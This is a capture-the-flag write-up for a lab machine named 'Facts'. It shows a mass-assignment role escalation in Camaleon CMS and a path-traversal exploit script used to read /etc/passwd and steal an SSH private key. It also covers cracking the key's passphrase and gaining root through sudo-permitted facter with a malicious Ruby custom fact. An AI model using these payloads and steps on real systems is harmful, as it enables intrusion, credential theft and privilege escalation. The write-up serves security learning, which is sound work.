---
tags:
        #LFI
        #MassAssignment
        #Sudo
        #Facter
---

## 1. Enumeration

### Nmap Scan
The initial reconnaissance begins with a standard Nmap scan to identify active services on the target machine.

```bash
nmap -sC -sV -Pn 10.129.244.96

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/
|_http-server-header: nginx/1.26.3 (Ubuntu)
```

The server identifies as **nginx 1.26.3** on Ubuntu and redirects to `http://facts.htb/`, indicating that **Virtual Hosting** is enforced.

### Subdomain Enumeration
Attempts to access the site via IP fail due to strict virtual hosting. I used `ffuf` to search for subdomains by fuzzing the `Host` header.

```bash
ffuf -u http://facts.htb -H "Host: FUZZ.facts.htb" -w /usr/share/wordlists/dirb/common.txt -fs 154
```

Filtering by size 154 (the default redirect page size) helped narrow down potential subdomains.

### Directory Brute-forcing
With the domain `facts.htb` added to `/etc/hosts`, I performed directory enumeration using `gobuster`.

```bash
gobuster dir -u http://facts.htb/ -w /usr/share/wordlists/dirb/common.txt
```

**Key Discovery:**
*   `/admin/login`: Leads to the administrative interface of the website.
*   **CMS Identified:** The site is powered by **Camaleon CMS v2.9.0**.

---

## 2. Web Exploitation (CMS Privilege Escalation)

After creating a regular user account and logging in, I focused on escalating privileges within the CMS itself.

### CMS Admin Role Elevation (CVE-2025-2304)
The application is vulnerable to **Mass Assignment** (Parameter Pollution) in the user profile update functionality.

1.  Navigate to the password change/profile update section.
2.  Intercept the request using **Burp Suite**.
3.  Modify the payload to include the `user[role]` parameter.

**Original Payload Snippet:**
`_method=patch&authenticity_token=...&password[password]=hcx1&password[password_confirmation]=hcx1`

**Modified Payload Snippet:**
`_method=patch&authenticity_token=...&password[password]=hcx1&password[password_confirmation]=hcx1&password[role]=admin`

By injecting `password[role]=admin`, the application updates the user's role in the database to "admin," granting access to administrative features that are later leveraged for further exploitation.

---

## 3. Exploitation (Local File Inclusion)

With administrative access to the CMS, I looked for ways to interact with the underlying file system.

### Local File Inclusion - LFI (CVE-2024-46987)
Camaleon CMS v2.9.0 contains a vulnerability in the `download_private_file` endpoint that allows for **Local File Inclusion (LFI)** via directory traversal.

**Vulnerability Principle:**
The application fails to sanitize the `file` parameter passed to the `admin/media/download_private_file` endpoint. By using traversal sequences (`../`), an attacker can navigate outside the intended media directory and read sensitive system files.

**Exploitation Steps:**
I used a Python exploit script to automate the LFI process:

1.  **Read `/etc/passwd` to identify users:**
    ```bash
    python3 CVE-2024-46987.py -u http://facts.htb -l hcx -p hcx1 /etc/passwd
    ```
    Identified user: `trivia` (UID: 1000).

2.  **Exfiltrate SSH Private Key:**
    ```bash
    python3 CVE-2024-46987.py -u http://facts.htb -l hcx -p hcx1 /home/trivia/.ssh/id_ed25519 | tee trivia_sshkey
    ```
	I first tried id_rsa, but it didn't work.
---

## 4. Initial Access (SSH)

The exfiltrated SSH key was encrypted with a passphrase.

### Cracking SSH Key Passphrase
I used `ssh2john` to convert the key into a format John the Ripper could understand, then cracked it using the `rockyou.txt` wordlist.

```bash
ssh2john trivia_sshkey > ssh_hash
john --wordlist=/usr/share/wordlists/rockyou.txt ssh_hash
```
**Cracked Passphrase:** `dragonballz`

### SSH Login
With the cracked passphrase, I established an SSH session as the user `trivia`.

```bash
chmod 400 trivia_sshkey
ssh -i trivia_sshkey trivia@facts.htb
```
	Use ip to perform ssh connection is forbidden in this case, maybe it's because the same policy of strict virtual hosting? 
---

## 5. Privilege Escalation (User: root)

After gaining initial access as `trivia`, I performed post-exploitation enumeration.

### Sudo Permissions
Checking `sudo -l` revealed that the user `trivia` can run `facter` with root privileges without a password.

```bash
User trivia may run the following commands on facts:
    (ALL) NOPASSWD: /usr/bin/facter
```

### Facter Abuse (Custom Fact Injection)
**Facter** is a tool used to collect system information, often used alongside Puppet. It allows users to define "custom facts" using Ruby scripts.

**Exploitation Principle:**
When `facter` is executed, it can be told to look for custom facts in a specific directory using the `--custom-dir` flag. If an attacker can write a Ruby script to a directory they control, they can force `facter` (running as root) to execute that script.

**Steps to Root:**

1.  **Create a malicious Ruby script:**
    ```bash
    echo 'Facter.add(:exploit) { setcode { system("/bin/bash") } }' > /tmp/exploit.rb
    ```
    This script defines a new fact called `exploit`. When `facter` attempts to resolve this fact, it executes `system("/bin/bash")`.

2.  **Execute Facter as Root:**
    ```bash
    sudo /usr/bin/facter -p --custom-dir /tmp exploit
    ```
    *   `-p`: Loads all facts (including custom ones).
    *   `--custom-dir /tmp`: Tells `facter` to look for Ruby scripts in `/tmp`.
    *   `exploit`: Specifically asks `facter` to resolve the fact we just defined.

Since `facter` is running as root via `sudo`, the spawned `/bin/bash` shell also has root privileges.

**Method 2:**
1. **Create a malicious Ruby script:**
   ```bash
	echo 'exec "/bin/bash"' > /tmp/exploit.rb
	```
	This script tells `facter` to substitute current ruby process to `/bin/bash`.

2. **Execute Facter as Root:**
   ```bash
   sudo /usr/bin/facter --custom-dir /tmp exploit
   ```


---

## 6. Vulnerability Principles

### CVE-2025-2304: Mass Assignment in User Roles
The vulnerability arises when an application takes user-supplied input (like a POST request body) and maps it directly to database model attributes without proper filtering. In this case, the `role` attribute was not marked as protected or excluded from the mass-update operation, allowing any user to elevate their status to an administrator.

### CVE-2024-46987: LFI via Path Traversal
This is a classic path traversal vulnerability in the file download functionality. The application appends the user-provided `file` parameter to a base path but fails to check if the resulting path is within the intended directory. Using `../` allows an attacker to "escape" the restricted area and access sensitive files like SSH keys, configuration files, and system logs.

### Facter Privilege Escalation
The risk lies in the trust model of `facter`. By design, `facter` executes Ruby code to determine system properties. When a user is granted the ability to run `facter` as root via `sudo`, they are effectively given the ability to execute arbitrary Ruby code as root. This highlights the importance of restricting `sudo` access to tools that can be extended with user-controlled code or plugins.
